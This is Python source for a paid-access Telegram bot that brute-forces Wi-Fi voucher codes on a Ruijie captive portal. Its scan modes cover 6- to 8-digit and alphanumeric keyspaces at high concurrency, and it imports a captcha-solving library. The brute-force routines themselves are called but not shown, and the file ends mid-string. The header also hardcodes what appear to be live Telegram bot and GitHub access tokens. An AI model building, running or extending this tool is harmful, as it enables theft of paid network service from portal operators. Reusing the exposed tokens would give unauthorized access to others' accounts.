import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

#ဒီနေရာမှာchangeပေးပါbro
BOT_TOKEN = '8826597987:AAGJZYfhu0cXrBnp6Ma7H0n0JsoTMUbO66E'
GITHUB_TOKEN = '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'
REPO_OWNER = "zarni1mobile122005-sudo"
REPO_NAME = "ID-Bot"
ADMIN_ID = "7592705124"
##################

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
session = None
_connector = None
CONCURRENCY = 900
_voucher_sem = None
_start_time = time.monotonic()

# ─── Authorized Users ──────────────────────────────────────────────────────
# Admin ကနေ ခွင့်ပြုထားတဲ့ users တွေကို သိမ်းမယ်
authorized_users = set()
authorized_users.add(int(ADMIN_ID))  # Admin ကို auto authorize

# ─── Load Authorized Users from GitHub ────────────────────────────────────
async def load_authorized_users():
    """GitHub ကနေ authorized users စာရင်းကိုယူမယ်"""
    global authorized_users
    try:
        auth_list, _ = await get_file_content("authorized_users.json")
        if auth_list and "users" in auth_list:
            for uid in auth_list["users"]:
                authorized_users.add(int(uid))
        # Admin ကို အမြဲတမ်းထည့်ထားမယ်
        authorized_users.add(int(ADMIN_ID))
        print(f"Loaded {len(authorized_users)} authorized users from GitHub")
    except Exception as e:
        print(f"Error loading authorized users: {e}")

# ─── Authorization Check ──────────────────────────────────────────────────
def is_authorized(chat_id):
    """User ကို သုံးခွင့်ရှိမရှိ စစ်တယ်"""
    return chat_id in authorized_users

# ─── Main Menu Buttons ──────────────────────────────────────────────────────
def main_menu(chat_id=None):
    keyboard = InlineKeyboardMarkup()
    
    # User က authorized ဖြစ်မှသာ buttons ကိုပြမယ်
    if chat_id and is_authorized(chat_id):
        keyboard.row(
            InlineKeyboardButton("🔗 Input Session", callback_data="menu_input"),
            InlineKeyboardButton("🔍 Start Scan", callback_data="menu_scan")
        )
        keyboard.row(
            InlineKeyboardButton("⏹ Stop Scan", callback_data="menu_stop"),
            InlineKeyboardButton("📋 My Codes", callback_data="menu_result")
        )
        keyboard.row(
            InlineKeyboardButton("🔄 Recheck", callback_data="menu_recheck"),
            InlineKeyboardButton("❓ Help", callback_data="menu_help")
        )
    else:
        # ခွင့်မပြုရင် admin ကိုဆက်သွယ်ခိုင်းတဲ့ button ပြမယ်
        keyboard.row(
            InlineKeyboardButton("👤 Contact Admin", url="https://t.me/mgzan201")
        )
        keyboard.row(
            InlineKeyboardButton("❓ Help", callback_data="menu_help")
        )
    
    return keyboard

# ─── Admin Menu ─────────────────────────────────────────────────────────────
def admin_menu():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("📊 Status", callback_data="admin_status"),
        InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys")
    )
    keyboard.row(
        InlineKeyboardButton("🔑 Gen Key", callback_data="admin_genkey"),
        InlineKeyboardButton("🗑 Del Key", callback_data="admin_delkey")
    )
    keyboard.row(
        InlineKeyboardButton("👥 Authorized Users", callback_data="admin_users"),
        InlineKeyboardButton("◀️ Back", callback_data="menu_main")
    )
    return keyboard

# ─── Scan Mode Selection ────────────────────────────────────────────────────
def scan_mode_menu():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("🔢 6 Digit", callback_data="scan_6"),
        InlineKeyboardButton("🔢 7 Digit", callback_data="scan_7"),
        InlineKeyboardButton("🔢 8 Digit", callback_data="scan_8")
    )
    keyboard.row(
        InlineKeyboardButton("🔤 ASCII Lower", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🔤 All (a-z0-9)", callback_data="scan_all")
    )
    keyboard.row(
        InlineKeyboardButton("◀️ Back", callback_data="menu_main")
    )
    return keyboard

# ─── Web Server ─────────────────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ─── GitHub Helpers ─────────────────────────────────────────────────────────
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

# ─── Key Functions ──────────────────────────────────────────────────────────
def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(
            year=yyyy, month=MM, day=dd,
            hour=hh, minute=mm, second=0,
            tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

# ─── /addmeb Command (Admin Only) ──────────────────────────────────────
@bot.message_handler(commands=['addmeb'])
async def add_user(message):
    """Admin က user အသစ်ကို ခွင့်ပြုပေးတဲ့ command"""
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "❌ No Permission")
        return
    
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(
            message,
            "⚠️ **Usage:**\n\n`/addmeb <chat_id>`\n\n"
            "**Example:** `/addmeb 123456789`",
            parse_mode="Markdown"
        )
        return
    
    try:
        new_user_id = int(args[1])
        if new_user_id in authorized_users:
            await bot.reply_to(
                message,
                f"ℹ️ User `{new_user_id}` is already authorized.",
                parse_mode="Markdown"
            )
            return
        
        authorized_users.add(new_user_id)
        
        # ခွင့်ပြုထားတဲ့ user ကို GitHub မှာလည်း သိမ်းမယ်
        auth_list, sha = await get_file_content("authorized_users.json")
        if not auth_list:
            auth_list = {"users": []}
        if new_user_id not in auth_list["users"]:
            auth_list["users"].append(new_user_id)
            await update_file_content(
                "authorized_users.json",
                auth_list,
                sha,
                f"Add user {new_user_id}"
            )
        
        await bot.reply_to(
            message,
            f"✅ **User Authorized!**\n\n"
            f"👤 User ID: `{new_user_id}`\n"
            f"📋 Status: `Authorized`",
            parse_mode="Markdown"
        )
        
        # ခွင့်ပြုခံရတဲ့ user ကို notification ပို့မယ်
        try:
            await bot.send_message(
                new_user_id,
                "✅ **You have been authorized to use this bot!**\n\n"
                "You can now use all commands.\n"
                "Type /help to see available commands.",
                parse_mode="Markdown"
            )
        except:
            pass
            
    except ValueError:
        await bot.reply_to(
            message,
            "❌ **Invalid User ID!**\n\n"
            "Please enter a valid numeric user ID.",
            parse_mode="Markdown"
        )

# ─── /removeuser Command (Admin Only) ──────────────────────────────────
@bot.message_handler(commands=['removeuser'])
async def remove_user(message):
    """Admin က user ကို ခွင့်မပြုတော့ဘူးဆိုတဲ့ command"""
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "❌ No Permission")
        return
    
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(
            message,
            "⚠️ **Usage:**\n\n`/removeuser <chat_id>`\n\n"
            "**Example:** `/removeuser 123456789`",
            parse_mode="Markdown"
        )
        return
    
    try:
        user_id = int(args[1])
        if user_id == int(ADMIN_ID):
            await bot.reply_to(
                message,
                "❌ Cannot remove the admin!",
                parse_mode="Markdown"
            )
            return
        
        if user_id not in authorized_users:
            await bot.reply_to(
                message,
                f"ℹ️ User `{user_id}` is not authorized.",
                parse_mode="Markdown"
            )
            return
        
        authorized_users.remove(user_id)
        
        # GitHub ကနေလည်း ဖျက်မယ်
        auth_list, sha = await get_file_content("authorized_users.json")
        if auth_list and user_id in auth_list.get("users", []):
            auth_list["users"].remove(user_id)
            await update_file_content(
                "authorized_users.json",
                auth_list,
                sha,
                f"Remove user {user_id}"
            )
        
        await bot.reply_to(
            message,
            f"🗑 **User Removed!**\n\n"
            f"👤 User ID: `{user_id}`\n"
            f"📋 Status: `Removed`",
            parse_mode="Markdown"
        )
            
    except ValueError:
        await bot.reply_to(
            message,
            "❌ **Invalid User ID!**\n\n"
            "Please enter a valid numeric user ID.",
            parse_mode="Markdown"
        )

# ─── /users Command (Admin Only) ──────────────────────────────────────
@bot.message_handler(commands=['users'])
async def list_users(message):
    """Authorized users စာရင်းကိုပြမယ်"""
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "❌ No Permission")
        return
    
    if not authorized_users:
        await bot.reply_to(message, "📭 No authorized users yet.")
        return
    
    # GitHub ကနေ လက်ရှိ authorized users စာရင်းကိုယူမယ်
    auth_list, _ = await get_file_content("authorized_users.json")
    github_users = auth_list.get("users", []) if auth_list else []
    
    lines = ["📋 **Authorized Users**\n"]
    lines.append(f"👥 Total: `{len(github_users)}` users\n")
    
    for uid in github_users:
        is_admin = "👑 Admin" if uid == int(ADMIN_ID) else "✅ User"
        lines.append(f"• `{uid}` - {is_admin}")
    
    text = "\n".join(lines)
    keyboard = admin_menu()
    
    if len(text) > 4096:
        for i in range(0, len(text), 4096):
            await bot.send_message(message.chat.id, text[i:i+4096], parse_mode="Markdown")
    else:
        await bot.reply_to(message, text, parse_mode="Markdown", reply_markup=keyboard)

# ─── /help Command ──────────────────────────────────────────────────────────
@bot.message_handler(commands=['help'])
async def help_command(message):
    chat_id = message.chat.id
    
    if not is_authorized(chat_id):
        await bot.reply_to(
            message,
            "❌ **You are not authorized to use this bot!**\n\n"
            "Please contact the admin to get access:\n"
            "👤 Admin: @mgzan201",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().row(
                InlineKeyboardButton("👤 Contact Admin", url="https://t.me/mgzan201")
            )
        )
        return
    
    help_text = """
🤖 **Voucher Scanner Bot**

━━━━━━━━━━━━━━━━━━━━━━
📌 **User Commands**
━━━━━━━━━━━━━━━━━━━━━━

🔗 `/input <session_url>` - Set your session URL
   Example: `/input https://portal-as.ruijienetworks.com/...`

🔍 `/scan <mode>` - Start scanning for voucher codes
   Modes: `6`, `7`, `8`, `ascii-lower`, `all`
   Example: `/scan 6` (scans 000000-999999)

📋 `/result` - Show your previously found codes

🔄 `/recheck` - Recheck your saved codes (they might still work)

⏹ `/stop` - Stop the current scan

❓ `/help` - Show this help message

━━━━━━━━━━━━━━━━━━━━━━
📌 **Admin Commands**
━━━━━━━━━━━━━━━━━━━━━━

👥 `/addmeb <user_id>` - Authorize a new user
   Example: `/addmeb 123456789`

🗑 `/removeuser <user_id>` - Remove a user
   Example: `/removeuser 123456789`

📋 `/users` - Show all authorized users

🔑 `/genkey <plan> <user_id>` - Generate a key
   Plans: `30m`, `1h`, `1d`, `7d`, `1m`, `1y`, `unlimited`

📋 `/listkeys` - Show all registered keys

🗑 `/delkey <user_id>` - Delete a user's key

📊 `/status` - Show bot status

━━━━━━━━━━━━━━━━━━━━━━
📌 **How It Works**
━━━━━━━━━━━━━━━━━━━━━━

1. Get authorized by the admin (@mgzan201)
2. Use `/input` with your session URL
3. Use `/scan` to start finding codes
4. Found codes auto-save to `/result`
5. Use `/recheck` to verify old codes
"""
    keyboard = main_menu(chat_id)
    await bot.reply_to(message, help_text, parse_mode="Markdown", reply_markup=keyboard)

# ─── /start Command ─────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    chat_id = message.chat.id
    
    if is_authorized(chat_id):
        keyboard = main_menu(chat_id)
        await bot.reply_to(
            message,
            "🤖 **Welcome to Voucher Scanner Bot!**\n\n"
            "You are authorized to use this bot.\n"
            "Use the buttons below or type commands.\n"
            "Type /help for detailed instructions.",
            parse_mode="Markdown",
            reply_markup=keyboard
        )
    else:
        keyboard = InlineKeyboardMarkup()
        keyboard.row(
            InlineKeyboardButton("👤 Contact Admin", url="https://t.me/mgzan201")
        )
        keyboard.row(
            InlineKeyboardButton("❓ Help", callback_data="menu_help")
        )
        await bot.reply_to(
            message,
            "❌ **You are not authorized to use this bot!**\n\n"
            "Please contact the admin to get access:\n"
            "👤 Admin: @mgzan201\n\n"
            "Click the button below to contact the admin.",
            parse_mode="Markdown",
            reply_markup=keyboard
        )

# ─── /key Command (Removed - No longer needed) ──────────────────────────
# Key command ကို ဖယ်ရှားလိုက်ပြီး authorization ကို admin က manage လုပ်မယ်

# ─── /input Command ────────────────────────────────────────────────────────
@bot.message_handler(commands=['input'])
async def handle_input(message):
    chat_id = message.chat.id
    
    if not is_authorized(chat_id):
        await bot.reply_to(
            message,
            "❌ **You are not authorized to use this bot!**\n\n"
            "Please contact the admin to get access.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().row(
                InlineKeyboardButton("👤 Contact Admin", url="https://t.me/mgzan201")
            )
        )
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        keyboard = InlineKeyboardMarkup()
        keyboard.row(InlineKeyboardButton("◀️ Back", callback_data="menu_main"))
        await bot.reply_to(
            message,
            "⚠️ **Usage:**\n\n`/input your_session_url`\n\n"
            "Example: `/input https://portal-as.ruijienetworks.com/...`",
            parse_mode="Markdown",
            reply_markup=keyboard
        )
        return
    url = args[1]
    await bot.reply_to(message, "⏳ Checking session URL...")
    if await check_session_url(session_url=url):
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['session_url'] = url
        keyboard = main_menu(chat_id)
        await bot.reply_to(
            message,
            "✅ **Session URL Saved!**\n\n"
            "You can now start scanning.\n"
            "Use `/scan 6` or select from the menu.",
            parse_mode="Markdown",
            reply_markup=keyboard
        )
    else:
        await bot.reply_to(
            message,
            "❌ **Invalid Session URL!**\n\n"
            "Please check your session URL and try again.",
            parse_mode="Markdown"
        )

# ─── /scan Command ──────────────────────────────────────────────────────────
@bot.message_handler(commands=['scan'])
async def scan(message):
    chat_id = message.chat.id
    
    if not is_authorized(chat_id):
        await bot.reply_to(
            message,
            "❌ **You are not authorized to use this bot!**\n\n"
            "Please contact the admin to get access.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().row(
                InlineKeyboardButton("👤 Contact Admin", url="https://t.me/mgzan201")
            )
        )
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        keyboard = scan_mode_menu()
        await bot.reply_to(
            message,
            "🔍 **Select Scan Mode:**\n\n"
            "Choose a mode from the buttons below,\n"
            "or type: `/scan <mode>`",
            parse_mode="Markdown",
            reply_markup=keyboard
        )
        return
    mode = args[1]
    await start_scan(chat_id, mode, message)

async def start_scan(chat_id, mode, message=None):
    if not is_authorized(chat_id):
        await bot.send_message(
            chat_id,
            "❌ **You are not authorized to use this bot!**",
            parse_mode="Markdown"
        )
        return
    
    if chat_id not in user_data:
        await bot.send_message(
            chat_id,
            "❌ **Please set your session URL first!**\n\n"
            "Use `/input` or the menu button.",
            parse_mode="Markdown"
        )
        return
    if 'session_url' not in user_data[chat_id]:
        await bot.send_message(
            chat_id,
            "❌ **Please set your session URL first!**\n\n"
            "Use `/input` or the menu button.",
            parse_mode="Markdown"
        )
        return
    if (
        chat_id in scan_tasks
        and not scan_tasks[chat_id]["task"].done()
    ):
        keyboard = InlineKeyboardMarkup()
        keyboard.row(InlineKeyboardButton("⏹ Stop Scan", callback_data="menu_stop"))
        await bot.send_message(
            chat_id,
            "⏳ **A scan is already running!**\n\n"
            "Please wait or stop it first.",
            parse_mode="Markdown",
            reply_markup=keyboard
        )
        return

    progress_msg = await bot.send_message(
        chat_id,
        "🔍 **Scanning Codes...**\n\n"
        "Starting scan...",
        parse_mode="Markdown"
    )
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg
        )
    )
    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id
    }

# ─── /result Command ────────────────────────────────────────────────────────
@bot.message_handler(commands=['result'])
async def handle_result(message):
    chat_id = message.chat.id
    
    if not is_authorized(chat_id):
        await bot.reply_to(
            message,
            "❌ **You are not authorized to use this bot!**\n\n"
            "Please contact the admin to get access.",
            parse_mode="Markdown"
        )
        return
    
    results, _ = await get_file_content("result.json")
    chat_id_str = str(chat_id)
    if chat_id_str in results and results[chat_id_str]:
        codes = "\n".join(results[chat_id_str])
        keyboard = main_menu(chat_id)
        await bot.reply_to(
            message,
            f"✅ **Found Codes:**\n\n```\n{codes}\n```",
            parse_mode="Markdown",
            reply_markup=keyboard
        )
    else:
        keyboard = main_menu(chat_id)
        await bot.reply_to(
            message,
            "📭 **No codes found yet.**\n\n"
            "Start a scan to find voucher codes!",
            parse_mode="Markdown",
            reply_markup=keyboard
        )

# ─── /recheck Command ──────────────────────────────────────────────────────
@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    
    if not is_authorized(chat_id):
        await bot.reply_to(
            message,
            "❌ **You are not authorized to use this bot!**\n\n"
            "Please contact the admin to get access.",
            parse_mode="Markdown"
        )
        return
    
    results, sha = await get_file_content("result.json")
    chat_id_str = str(chat_id)
    if chat_id_str in results and results[chat_id_str]:
        if chat_id not in user_data:
            await bot.reply_to(
                message,
                "❌ **Please set your session URL first!**\n\n"
                "Use `/input` or the menu button.",
                parse_mode="Markdown"
            )
            return
        if "session_url" not in user_data[chat_id]:
            await bot.reply_to(
                message,
                "❌ **Please set your session URL first!**\n\n"
                "Use `/input` or the menu button.",
                parse_mode="Markdown"
            )
            return
        codes = results[chat_id_str]
        await bot.reply_to(
            message,
            "🔄 **Rechecking your codes...**\n\n"
            f"Checking {len(codes)} codes...",
            parse_mode="Markdown"
        )
        session_url_recheck = user_data[chat_id]["session_url"]
        recheck_list = []
        for code in codes:
            recode = await perform_check(
                session_url_recheck,
                code,
                chat_id,
                scan_id=None,
                recheck=True,
                message=message
            )
            if recode:
                recheck_list.append(recode)
        if recheck_list:
            to_show = "\n".join(recheck_list)
            await bot.reply_to(
                message,
                f"✅ **Rechecked Codes:**\n\n```\n{to_show}\n```",
                parse_mode="Markdown"
            )
        else:
            await bot.reply_to(
                message,
                "📭 **No working codes found.**\n\n"
                "All your codes might be expired.",
                parse_mode="Markdown"
            )
        await save_rechecked_codes(chat_id_str, recheck_list, sha)
    else:
        keyboard = main_menu(chat_id)
        await bot.reply_to(
            message,
            "📭 **You don't have any saved codes yet.**\n\n"
            "Start a scan to find voucher codes!",
            parse_mode="Markdown",
            reply_markup=keyboard
        )

# ─── /stop Command ──────────────────────────────────────────────────────────
@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    
    if not is_authorized(chat_id):
        await bot.reply_to(
            message,
            "❌ **You are not authorized to use this bot!**\n\n"
            "Please contact the admin to get access.",
            parse_mode="Markdown"
        )
        return
    
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        keyboard = main_menu(chat_id)
        await bot.reply_to(
            message,
            "⏹ **Scan Stopped!**\n\n"
            "The scan has been stopped successfully.",
            parse_mode="Markdown",
            reply_markup=keyboard
        )
    else:
        await bot.reply_to(
            message,
            "ℹ️ **No scan is currently running.**",
            parse_mode="Markdown"
        )

# ─── /status Command (Admin) ──────────────────────────────────────────────
@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "❌ No Permission")
        return
    active_scans = sum(
        1 for data in scan_tasks.values()
        if not data["task"].done()
    )
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    keyboard = admin_menu()
    await bot.reply_to(
        message,
        f"📊 **Bot Status**\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"👥 Authorized Users: {len(authorized_users)}\n"
        f"👥 Sessions Loaded: {len(user_data)}",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# ─── /listkeys Command (Admin) ─────────────────────────────────────────────
@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "❌ No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "📭 No registered keys yet.")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "♾️ Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "⏰ Expired"
                        else:
                            diff = exp_dt - now
                            days = diff.days
                            hours, rem = divmod(diff.seconds, 3600)
                            minutes = rem // 60
                            expires_str = f"{days}d {hours}h {minutes}m left"
                    except:
                        expires_str = expires
            else:
                plan = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 **Registered Keys** ({len(auth_list)})\n\n" + "\n\n".join(lines)
        keyboard = admin_menu()
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096], parse_mode="Markdown")
        else:
            await bot.reply_to(message, text, parse_mode="Markdown", reply_markup=keyboard)
    except Exception as e:
        print(f"Error at listkeys {e}")

# ─── /genkey Command (Admin) ──────────────────────────────────────────────
@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "❌ No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(
                message,
                "⚠️ **Usage:**\n\n`/genkey <plan> <user_id>`\n\n"
                "**Plans:** `30m`, `1h`, `1d`, `7d`, `1m`, `1y`, `unlimited`\n"
                "**Example:** `/genkey 7d 123456789`",
                parse_mode="Markdown"
            )
            return
        plan = args[1]
        user_id = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(
                message,
                "⚠️ **Invalid Plan!**\n\n"
                "**Plans:** `30m`, `1h`, `1d`, `7d`, `1m`, `1y`, `unlimited`",
                parse_mode="Markdown"
            )
            return
        auth_list, sha = await get_file_content("auth_list.json")
        auth_list[user_id] = {
            "expires_at": expiry,
            "plan": plan
        }
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Add key for {user_id}"
        )
        keyboard = admin_menu()
        await bot.reply_to(
            message,
            f"✅ **Key Generated!**\n\n"
            f"👤 USER ID: `{user_id}`\n"
            f"📋 PLAN: `{plan}`\n"
            f"⏰ EXPIRES: `{expiry}`",
            parse_mode="Markdown",
            reply_markup=keyboard
        )
    except Exception as e:
        print(f"Error at genkey {e}")

# ─── /delkey Command (Admin) ──────────────────────────────────────────────
@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "❌ No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(
                message,
                "⚠️ **Usage:**\n\n`/delkey <user_id>`\n\n"
                "**Example:** `/delkey 123456789`",
                parse_mode="Markdown"
            )
            return
        user_id = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        if user_id not in auth_list:
            await bot.reply_to(
                message,
                f"❌ User ID `{user_id}` not found.",
                parse_mode="Markdown"
            )
            return
        del auth_list[user_id]
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Delete key for {user_id}"
        )
        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        keyboard = admin_menu()
        await bot.reply_to(
            message,
            f"🗑 **Key Deleted!**\n\n"
            f"👤 USER ID: `{user_id}`",
            parse_mode="Markdown",
            reply_markup=keyboard
        )
    except Exception as e:
        print(f"Error at delkey {e}")

# ─── Callback Query Handler ────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda call: True)
async def callback_query(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    # ─── Main Menu ────────────────────────────────────────────────────────
    if call.data == "menu_main":
        if is_authorized(chat_id):
            await bot.edit_message_text(
                "🤖 **Main Menu**\n\n"
                "Choose an option below:",
                chat_id=chat_id,
                message_id=message_id,
                parse_mode="Markdown",
                reply_markup=main_menu(chat_id)
            )
        else:
            keyboard = InlineKeyboardMarkup()
            keyboard.row(
                InlineKeyboardButton("👤 Contact Admin", url="https://t.me/mgzan201")
            )
            await bot.edit_message_text(
                "❌ **You are not authorized to use this bot!**\n\n"
                "Please contact the admin to get access.",
                chat_id=chat_id,
                message_id=message_id,
                parse_mode="Markdown",
                reply_markup=keyboard
            )
        await call.answer()

    # ─── Input Session ────────────────────────────────────────────────────
    elif call.data == "menu_input":
        if not is_authorized(chat_id):
            await call.answer("❌ You are not authorized!", show_alert=True)
            return
        await bot.edit_message_text(
            "🔗 **Input Session URL**\n\n"
            "Please type `/input <your_session_url>` in the chat.\n\n"
            "Example:\n"
            "`/input https://portal-as.ruijienetworks.com/...`",
            chat_id=chat_id,
            message_id=message_id,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().row(
                InlineKeyboardButton("◀️ Back", callback_data="menu_main")
            )
        )
        await call.answer()

    # ─── Scan ─────────────────────────────────────────────────────────────
    elif call.data == "menu_scan":
        if not is_authorized(chat_id):
            await call.answer("❌ You are not authorized!", show_alert=True)
            return
        await bot.edit_message_text(
            "🔍 **Select Scan Mode**\n\n"
            "Choose a mode below:",
            chat_id=chat_id,
            message_id=message_id,
            parse_mode="Markdown",
            reply_markup=scan_mode_menu()
        )
        await call.answer()

    elif call.data.startswith("scan_"):
        if not is_authorized(chat_id):
            await call.answer("❌ You are not authorized!", show_alert=True)
            return
        mode = call.data.replace("scan_", "")
        await bot.edit_message_text(
            f"🔍 **Starting Scan**\n\n"
            f"Mode: `{mode}`\n"
            f"Please wait...",
            chat_id=chat_id,
            message_id=message_id,
            parse_mode="Markdown"
        )
        await call.answer()
        # Create a fake message object for scan
        class FakeMessage:
            def __init__(self, chat_id):
                self.chat = type('obj', (object,), {'id': chat_id})()
        await start_scan(chat_id, mode, FakeMessage(chat_id))

    # ─── Stop Scan ────────────────────────────────────────────────────────
    elif call.data == "menu_stop":
        if not is_authorized(chat_id):
            await call.answer("❌ You are not authorized!", show_alert=True)
            return
        data = scan_tasks.get(chat_id)
        if data and not data["task"].done():
            data["stop"] = True
            data["scan_id"] = None
            data["task"].cancel()
            success_messages.pop(chat_id, None)
            success_texts.pop(chat_id, None)
            limited_messages.pop(chat_id, None)
            limited_texts.pop(chat_id, None)
            await bot.edit_message_text(
                "⏹ **Scan Stopped!**\n\n"
                "The scan has been stopped successfully.",
                chat_id=chat_id,
                message_id=message_id,
                parse_mode="Markdown",
                reply_markup=main_menu(chat_id)
            )
        else:
            await bot.edit_message_text(
                "ℹ️ **No scan is currently running.**",
                chat_id=chat_id,
                message_id=message_id,
                parse_mode="Markdown",
                reply_markup=main_menu(chat_id)
            )
        await call.answer()

    # ─── Result ───────────────────────────────────────────────────────────
    elif call.data == "menu_result":
        if not is_authorized(chat_id):
            await call.answer("❌ You are not authorized!", show_alert=True)
            return
        results, _ = await get_file_content("result.json")
        chat_id_str = str(chat_id)
        if chat_id_str in results and results[chat_id_str]:
            codes = "\n".join(results[chat_id_str])
            keyboard = main_menu(chat_id)
            await bot.edit_message_text(
                f"✅ **Found Codes:**\n\n```\n{codes}\n```",
                chat_id=chat_id,
                message_id=message_id,
                parse_mode="Markdown",
                reply_markup=keyboard
            )
        else:
            keyboard = main_menu(chat_id)
            await bot.edit_message_text(
                "📭 **No codes found yet.**\n\n"
                "Start a scan to find voucher codes!",
                chat_id=chat_id,
                message_id=message_id,
                parse_mode="Markdown",
                reply_markup=keyboard
            )
        await call.answer()

    # ─── Recheck ──────────────────────────────────────────────────────────
    elif call.data == "menu_recheck":
        if not is_authorized(chat_id):
            await call.answer("❌ You are not authorized!", show_alert=True)
            return
        # Trigger recheck with a fake message
        class FakeMessage:
            def __init__(self, chat_id):
                self.chat = type('obj', (object,), {'id': chat_id})()
        await recheck(FakeMessage(chat_id))
        await bot.delete_message(chat_id, message_id)
        await call.answer()

    # ─── Help ─────────────────────────────────────────────────────────────
    elif call.data == "menu_help":
        if is_authorized(chat_id):
            help_text = """
🤖 **Bot Commands & Usage**

━━━━━━━━━━━━━━━━━━━━━━
📌 **User Commands**
━━━━━━━━━━━━━━━━━━━━━━

